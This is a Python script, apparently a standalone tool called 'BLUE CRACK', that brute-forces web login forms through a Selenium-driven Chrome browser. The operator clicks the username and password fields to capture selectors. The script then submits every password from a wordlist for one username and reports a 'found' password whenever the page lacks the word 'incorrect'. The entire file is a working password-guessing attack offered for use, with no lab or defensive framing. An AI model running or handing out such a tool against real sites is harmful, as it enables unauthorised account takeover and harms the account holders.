print("""
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ╚██╗ ██╔╝██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗ ╚████╔╝ ███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
""")
import argparse
import threading
import time
from queue import Queue

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import keyboard

# CLI ARGUMENTS (HYDRA STYLE)
parser = argparse.ArgumentParser(description="Hydra-style Browser Tester")

# USERNAME INPUT
parser.add_argument("-u", "--user", dest="username",
                    help="single username to test")
parser.add_argument("-U", "--userfile", dest="userfile",
                    help="file containing list of usernames")

# PASSWORD INPUT
parser.add_argument("-p", "--passw", dest="password",
                    help="single password to test")
parser.add_argument("-P", "--passlist", dest="passfile",
                    help="file containing list of passwords")

# OTHER
parser.add_argument("--threads", type=int, default=1,
                    help="number of threads")
parser.add_argument("--url", required=True,
                    help="login page URL")

args = parser.parse_args()
if not args.username and not args.userfile:
    raise SystemExit("❌ Provide -u USER or -U USERFILE")

if not args.password and not args.passfile:
    raise SystemExit("❌ Provide -p PASS or -P PASSLIST")
    
# LOAD USERNAMES
users = []

if args.username:
    users.append(args.username)

if args.userfile:
    with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            users.append(line.strip())
# LOAD PASSWORDS
passwords = []

if args.password:
    passwords.append(args.password)

if args.passfile:
    with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            passwords.append(line.strip())

USERNAME_FIXED = users[0] if len(users) == 1 else None
USERLIST = users if len(users) > 1 else None

PASSWORD_FIXED = passwords[0] if len(passwords) == 1 else None
PASSLIST = passwords if len(passwords) > 1 else None
WORDLIST = "Single password" if PASSWORD_FIXED else f"{len(PASSLIST)} passwords loaded"

THREADS = args.threads
TARGET_URL = args.url


# LAUNCH SELENIUM
driver = webdriver.Chrome()
driver.get(TARGET_URL)

username_selector = None
password_selector = None
submit_selector = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Threads: {THREADS}")
print("\n👉 CLICK username field → press S")
print("👉 CLICK password field → press T")
print("👉 Press ENTER to start brute\n")

# Inject JS to track last clicked element
driver.execute_script("""
document.addEventListener('click', function(e) {
    window._lastClicked = e.target;
});
""")

# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
def get_css_selector():
    elem = driver.execute_script("return window._lastClicked")
    if elem is None:
        return None
    return driver.execute_script("""
    function cssPath(el){
        if (!el) return null;
        var path = [];
        while (el.nodeType === Node.ELEMENT_NODE){
            var selector = el.nodeName.toLowerCase();
            if (el.id){
                selector += "#" + el.id;
                path.unshift(selector);
                break;
            } else {
                var sib = el, nth = 1;
                while(sib = sib.previousElementSibling){
                    if (sib.nodeName.toLowerCase() == selector)
                        nth++;
                }
                if (nth != 1)
                    selector += ":nth-of-type("+nth+")";
            }
            path.unshift(selector);
            el = el.parentNode;
        }
        return path.join(" > ");
    }
    return cssPath(arguments[0]);
    """, elem)

# WAIT FOR USER TO LOCK FIELDS
while username_selector is None or password_selector is None:
    if keyboard.is_pressed("s"):
        css = get_css_selector()
        if css:
            username_selector = css
            print(f"🔵 Username selector LOCKED: {css}")
        time.sleep(0.3)
    if keyboard.is_pressed("t"):
        css = get_css_selector()
        if css:
            password_selector = css
            print(f"🟣 Password selector LOCKED: {css}")
        time.sleep(0.3)

print("\nSelectors locked! Press ENTER to launch brute...")

# TEST THE SELECTORS IMMEDIATELY (fix)
driver.find_element(By.CSS_SELECTOR, username_selector)
driver.find_element(By.CSS_SELECTOR, password_selector)

keyboard.wait("enter")

# LOAD WORDLIST
q = Queue()
for pwd in passwords:
    q.put(pwd)

found = False

# WORKER FUNCTION
def worker():
    global found
    while not q.empty() and not found:
        pwd = q.get()
        try:
            driver.get(TARGET_URL)
            try:
                u = driver.find_element(By.CSS_SELECTOR, username_selector)
                p = driver.find_element(By.CSS_SELECTOR, password_selector)
                u.clear()
                u.send_keys(USERNAME_FIXED)
                p.clear()
                p.send_keys(pwd)
                p.send_keys(Keys.ENTER)
                print(f"Trying: {USERNAME_FIXED} / {pwd}")
                time.sleep(1)
                if "incorrect" not in driver.page_source.lower():
                    print(f"\n🔥🔥 PASSWORD FOUND: {pwd} 🔥🔥\n")
                    found = True
                    break
            except (NoSuchElementException, WebDriverException) as e:
                print(f"Element/driver error during attempt with '{pwd}': {e}")
        except Exception as e:
            print(f"Navigation or unexpected error: {e}")

# THREAD LAUNCHER
threads = []
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("\nDone.")
finally:
    try:
        driver.quit()
    except Exception:
        pass
